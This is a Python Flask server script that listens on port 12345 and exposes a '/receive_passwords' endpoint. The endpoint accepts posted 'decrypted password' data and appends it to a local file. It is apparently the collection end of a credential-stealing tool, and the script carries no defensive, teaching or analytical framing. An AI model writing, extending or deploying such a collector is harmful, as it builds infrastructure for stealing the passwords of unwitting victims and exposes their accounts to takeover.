from flask import Flask, request, jsonify
import os
import json

app = Flask(__name__)

# Directory to store the received data
STORAGE_DIR = 'received_data'
if not os.path.exists(STORAGE_DIR):
    os.makedirs(STORAGE_DIR)

# Endpoint to receive the decrypted password data
@app.route('/receive_passwords', methods=['POST'])
def receive_passwords():
    try:
        data = request.get_json()
        if not data or 'passwords' not in data:
            return jsonify({"error": "No password data received"}), 400
        
        passwords = data['passwords']

        # Save the data to a file
        file_path = os.path.join(STORAGE_DIR, 'decrypted_passwords.json')
        with open(file_path, 'a') as file:
            json.dump(passwords, file)
            file.write("\n")  # Add a newline for separation

        return jsonify({"message": "Passwords received and saved successfully"}), 200
    
    except Exception as e:
        return jsonify({"error": f"Failed to process passwords: {str(e)}"}), 500

if __name__ == "__main__":
    # Run the Flask server
    app.run(host="0.0.0.0", port=12345)
